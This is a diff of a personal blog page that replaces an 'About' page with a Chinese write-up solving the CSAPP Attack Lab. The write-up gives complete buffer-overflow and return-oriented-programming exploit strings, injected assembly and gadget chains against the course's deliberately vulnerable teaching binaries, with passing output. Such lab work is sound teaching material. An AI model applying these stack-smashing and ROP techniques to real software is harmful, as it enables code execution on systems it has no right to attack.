@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="独语斜阑">
 <meta name="theme-color" content="#000">
-<title>关于 | 语阑gz</title>
+<title>CSAPP: Attacklab | 语阑gz</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1628260444853">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -41,8 +41,8 @@
 
 
 
-  <meta name="description" content="关于" />
-  <meta name="keywords" content="" />
+  <meta name="description" content="CSAPP: Attacklab" />
+  <meta name="keywords" content="CSAPP" />
 </head>
 
 <body>
@@ -255,8 +255,36 @@
     <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99">🏠 关于本站</a></li>
-<li><a href="#%E8%81%94%E7%B3%BB%E6%88%91%E5%91%80">📬 联系我呀</a></li>
+<li><a href="#level1">Level1</a>
+<ul>
+<li><a href="#%E6%9F%A5%E7%9C%8Btouch1%E7%9A%84%E5%9C%B0%E5%9D%80">查看touch1的地址</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2">构造我们的输入字符串</a></li>
+<li><a href="#%E9%80%9A%E8%BF%87hex2raw%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B9%B6%E6%89%A7%E8%A1%8C">通过hex2raw生成攻击字符串并执行</a></li>
+</ul>
+</li>
+<li><a href="#level2">Level2</a>
+<ul>
+<li><a href="#%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%8F%92%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81">我们需要插入的代码</a>
+<ul>
+<li><a href="#%E9%80%9A%E8%BF%87gdb%E6%9F%A5%E7%9C%8Brep%E7%9A%84%E5%80%BC">通过gdb查看%rep的值</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#level3">Level3</a><br>
+*
+<ul>
+<li><a href="#%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81">生成机器码</a></li>
+<li><a href="#%E6%9C%80%E7%BB%88%E5%86%99%E5%87%BA%E5%85%A5%E4%BE%B5%E5%AD%97%E4%B8%B2">最终写出入侵字串</a></li>
+<li><a href="#%E9%80%9A%E8%BF%87">通过！！！</a></li>
+</ul>
+</li>
+<li><a href="#rtarget">rtarget</a>
+<ul>
+<li><a href="#1">1</a></li>
+<li><a href="#2">2</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -524,8 +552,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://yulangz.github.io/post/about/">
-      关于
+    <a class="post-title-link" href="https://yulangz.github.io/post/uscxh7_ainkg2/">
+      CSAPP: Attacklab
     </a>
   </h1>
   <div class="post-meta">
@@ -533,37 +561,282 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-08-06 17:58:53">2021-08-06</span>
+      <span class="publish-time" data-t="2021-08-06 13:35:26">2021-08-06</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
     <span class="meta-item">
+      <i class="fa fa-folder-o"></i>
+      <span class="pc-show language" data-lan="category-in">分类于</span>
+      
+      
+      <a href="https://yulangz.github.io/tag/Gr1xnj72j/">
+        <span>CSAPP</span>
+      </a>
+      
+      
+    </span>
+    <span class="post-meta-divider">|</span>
+    
+    <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>1<span class="language" data-lan="minute">分钟</span></span>
+      <span>11<span class="language" data-lan="minute">分钟</span></span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>115<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>2144<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <blockquote>
-<p>欢迎来到我的小站呀，很高兴遇见你！🤝</p>
-</blockquote>
-<h2 id="关于本站">🏠 关于本站</h2>
+              <p>这个实验要求在5个有不同安全漏洞的代码上进行攻击(一开始我还以为是要修复漏洞...)，总共有两种攻击方式：</p>
 <ul>
-<li>本站的创作内容全部来源于<a href="https://www.yuque.com/yulan-updh1">我的语雀知识库</a>，欢迎大家访问</li>
-<li>我的创作通常会第一时间发布到语雀上，因此语雀中也会包含很多未分类的、草稿性质的文章</li>
-<li>每隔一定时间，我会将语雀上我认为优质的内容同步到本站</li>
+<li>Code Injection Attacks（缓冲区溢出攻击）</li>
+<li>Return-Oriented Programming（ROP攻击）</li>
 </ul>
-<h2 id="联系我呀">📬 联系我呀</h2>
-<p><a href="mailto:1301481108@qq.com">1301481108@qq.com</a></p>
+<p>从CSAPP网站下载下来解压后一共有五个文件：</p>
+<ul>
+<li><code>ctarget</code>：一个容易遭受code injection攻击的可执行程序。</li>
+<li><code>rtarget</code>：一个容易遭受return-oriented programming攻击的可执行程序。</li>
+<li><code>cookie.txt</code>：一个8位的十六进制码，用于验证身份的唯一标识符。</li>
+<li><code>farm.c</code>：目标“gadget farm”的源代码，用于产生return-oriented programming攻击。</li>
+<li><code>hex2raw</code>：一个生成攻击字符串的工具。</li>
+</ul>
+<p>实验之前一定要阅读<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">指导手册</a>，还有<a href="http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf">GDB指南</a>，对实验很有帮助。</p>
+<h2 id="level1">Level1</h2>
+<p>要求我们输入一段字符串，通过缓冲区溢出改变函数的返回地址，定向到 <code>touch1</code> 函数<br>
+首先看看 <code>test</code> 函数：</p>
+<pre><code>0000000000401968 &lt;test&gt;:
+  401968:	48 83 ec 08          	sub    $0x8,%rsp
+  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
+  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;
+  401976:	89 c2                	mov    %eax,%edx
+  401978:	be 88 31 40 00       	mov    $0x403188,%esi
+  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
+  401982:	b8 00 00 00 00       	mov    $0x0,%eax
+  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;
+  40198c:	48 83 c4 08          	add    $0x8,%rsp
+  401990:	c3                   	retq
+</code></pre>
+<p>没有什么特别之处<br>
+我们再看下 <code>getbuf</code> 函数：</p>
+<pre><code>00000000004017a8 &lt;getbuf&gt;:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq
+</code></pre>
+<p>首先创建一个 40 个字节的缓冲区( <code>0x28=40</code> )，然后通过Gets函数读取一个字符串到缓冲区。<br>
+我们先来查看一下stack的状态：</p>
+<pre><code>(gdb) x/60b $rsp
+0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
+0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dcb0:     0x24    0x1f    0x40    0x00
+</code></pre>
+<p>可以看到距离 <code>%rsp</code> 的第41,42,43字节处有一个值 <code>761940</code> ，猜测这是一个返回地址，Ctrl+F查找<br>
+然而<br>
+<img src="http://static.yulan.net.cn/image/_0da3636d63a59ddbf940c5191d99cf0e.png" alt="" loading="lazy"><br>
+忽然想起小端序的问题，所以这个地址应该是 <code>401976</code><br>
+<img src="http://static.yulan.net.cn/image/_65725cc8a986fa6dbca8525ef2087c08.png" alt="" loading="lazy"><br>
+就是getbuf函数后一条指令的位置。<br>
+所以我们只需要通过缓冲区溢出来改变这个指令地址即可。</p>
+<h3 id="查看touch1的地址">查看touch1的地址</h3>
+<pre><code>00000000004017c0 &lt;touch1&gt;:
+  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
+</code></pre>
+<h3 id="构造我们的输入字符串">构造我们的输入字符串</h3>
+<pre><code>11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40
+</code></pre>
+<p>前40位不重要</p>
+<h3 id="通过hex2raw生成攻击字符串并执行">通过hex2raw生成攻击字符串并执行</h3>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./hex2raw &lt; exploit1.txt &gt; exploit1-raw.txt
+ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit1-raw.txt 
+Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40
+</code></pre>
+<p>通过！！！</p>
+<h2 id="level2">Level2</h2>
+<p>这一关要我们从test跳转到另外一个函数 <code>touch2</code> ，同时将我们自己的cookie作为参数传给 <code>touch2</code> ，这个参数默认应该在%rdi中。<br>
+这一关我们不仅要修改跳转地址，还要插入一段代码进去执行，我们可以把这段代码插在缓冲区之中，然后将返回地址修改为我们代码的地址，并我们的代码中加入ret指令，使他最后返回到 <code>touch2</code> 的入口</p>
+<h3 id="我们需要插入的代码">我们需要插入的代码</h3>
+<pre><code>mov $0x59b997fa,%rdi
+pushq $0x4017ec
+retq
+</code></pre>
+<p>很简单，只用将cookie保存到%rdi，然后重新指定 <code>touch2</code> 的地址为返回地址即可<br>
+使用gcc与objdump生成机器指令</p>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ gcc -c asscode.s
+ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o
+
+asscode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 ec 17 40 00          pushq  $0x4017ec
+   c:   c3                      retq
+</code></pre>
+<p>把指令插在缓冲区</p>
+<pre><code>48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  78 dc 61 55
+</code></pre>
+<p>和level1一样，前面40个字节，后面是我们指定的返回地址，这里我们要将他指定为我们的代码插入的位置，也就是缓存区的起始地址。</p>
+<h4 id="通过gdb查看rep的值">通过gdb查看%rep的值</h4>
+<pre><code>(gdb) print $rsp
+$2 = (void *) 0x5561dc78
+</code></pre>
+<p>所以最后四个字节应该是 <code>78</code> <code>dc</code> <code>61</code> <code>55</code><br>
+最后和level1一样执行</p>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit2-raw.txt 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
+</code></pre>
+<h2 id="level3">Level3</h2>
+<p>这一关和level2差不多，只是这次传的参数是一个指针，其实差不多，我们先把cookie存在栈里面，然后把地址传给%rdi即可。<br>
+<img src="http://static.yulan.net.cn/image/_d13d42c5c8d72192ca39358968839d97.png" alt="" loading="lazy"><br>
+要注意函数hexmatch会使用栈上的空间，可能会覆盖我们的cookie<br>
+<strong>不过没关系，</strong><code>**sub 0x28 %rsp**</code>**  ，咱给自己造个栈**<br>
+所以我们嵌入的代码应该是</p>
+<pre><code>movq $0x5561dc93,%rdi
+sub $0x28,%rsp
+pushq $0x4018fa
+retq
+</code></pre>
+<p>其中第一步传给%rdi的地址应该是你存放cookie的地址，一定要数清楚，我们还要把cookie使用ascii码转义，并在末尾添加 <code>0x00</code> 表示结束。</p>
+<h4 id="生成机器码">生成机器码</h4>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ objdump -d asscode.o
+
+asscode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 93 dc 61 55    mov    $0x5561dc93,%rdi
+   7:   48 83 ec 28             sub    $0x28,%rsp
+   b:   68 fa 18 40 00          pushq  $0x4018fa
+  10:   c3                      retq
+</code></pre>
+<h3 id="最终写出入侵字串">最终写出入侵字串</h3>
+<pre><code>48 c7 c7 93 dc 61 55 48 83 ec 28 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00  78 dc 61 55
+</code></pre>
+<h3 id="通过">通过！！！</h3>
+<pre><code>ubuntu@VM-0-7-ubuntu:~/CSAPPlab/03-attacklab/target1$ ./ctarget -q -i exploit3-raw.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 93 DC 61 55 48 83 EC 28 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 78 DC 61 55
+</code></pre>
+<h2 id="rtarget">rtarget</h2>
+<h3 id="1">1</h3>
+<p>rtarget要求我们进行ROP攻击，因为栈随机化，所以我们不能像之前一样指定地址，只能依靠代码中原有的gadget进行入侵。<br>
+我的想法是先把cookie pop到某个寄存器中，然后再mov到rdi里面。<br>
+参考了实验手册，检索了fram部分的代码后发现只有 <code>58</code> 可以使用，也就是 <code>popq %rax</code> <br>
+<img src="http://static.yulan.net.cn/image/_74f7a02a83c7342936036627bf6b81df.png" alt="" loading="lazy"><br>
+然后寻找到一段 <code>movq %rax,%rdi</code> 的指令。<br>
+<img src="http://static.yulan.net.cn/image/_519414af020393b2e70643e9fd7c701e.png" alt="" loading="lazy"><br>
+这两个就是我们使用的gagget，地址分别是 <code>0x4019ab</code> 和· <code>0x4019a2</code>。<br>
+将他们连续执行就会是如下情形：</p>
+<pre><code>popq %rax
+nop
+ret
+movq %rax,%rdi
+ret
+</code></pre>
+<p>我们只用准备好pop出的数据和返回位置即可。<br>
+这里要注意栈是向高字节收缩，所以我们需要把我们的插入片段放在40字节缓冲区后面。<br>
+应该插入的代码如下</p>
+<pre><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
+</code></pre>
+<p>前40个字节没有实际意义，后面指定返回地址与准备pop出的数据</p>
+<h3 id="2">2</h3>
+<p>有些复杂，直接贴出来了</p>
+<pre><code>35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00            06 1a 40 00 00 00 00 00            /* mov %rsp,%rax */
+a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
+
+ab 19 40 00 00 00 00 00            /* pop %rax */
+48 00 00 00 00 00 00 00
+
+dd 19 40 00 00 00 00 00            /* mov %eax,%edx */
+70 1a 40 00 00 00 00 00            /* mov %edx,%ecx */
+13 1a 40 00 00 00 00 00            /* mov %ecx,%esi */
+d6 19 40 00 00 00 00 00            /* lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00            /* mov %rax,%rdi */
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61            /* cookie string */
+00 00 00 00 00 00 00 00
+</code></pre>
 
             </div>
             
+            
+              <div class="post-footer">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong class="language" data-lan="author">本文作者：</strong>
+      语阑gz
+    </li>
+    <li class="post-copyright-link">
+      <strong class="language" data-lan="link">本文链接：</strong>
+      <a href="https://yulangz.github.io/post/uscxh7_ainkg2/" title="CSAPP: Attacklab">https://yulangz.github.io/post/uscxh7_ainkg2/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong class="language" data-lan="copyright">版权声明： </strong>
+      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+  <div class="tags">
+    
+      <a href="https://yulangz.github.io/tag/Gr1xnj72j/"># CSAPP</a>
+    
+  </div>
+  <div class="nav">
+    <div class="nav-prev">
+      
+        <i class="fa fa-chevron-left"></i>
+        <a class="nav-pc-next" title="CSAPP: cachelab" href="https://yulangz.github.io/post/uscxh7_mezrog/">CSAPP: cachelab</a class="nav-pc-next">
+        <a class="nav-mobile-prev" title="CSAPP: cachelab" href="https://yulangz.github.io/post/uscxh7_mezrog/">上一篇</a>
+      
+    </div>
+    <div class="nav-next">
+      
+        <a class="nav-pc-next" title="CSAPP: Bomblab" href="https://yulangz.github.io/post/uscxh7_qulnpm/">CSAPP: Bomblab</a>
+        <a class="nav-mobile-next" title="CSAPP: Bomblab" href="https://yulangz.github.io/post/uscxh7_qulnpm/">下一篇</a>
+        <i class="fa fa-chevron-right"></i>
+      
+    </div>
+  </div>
+</div>
             
             
   
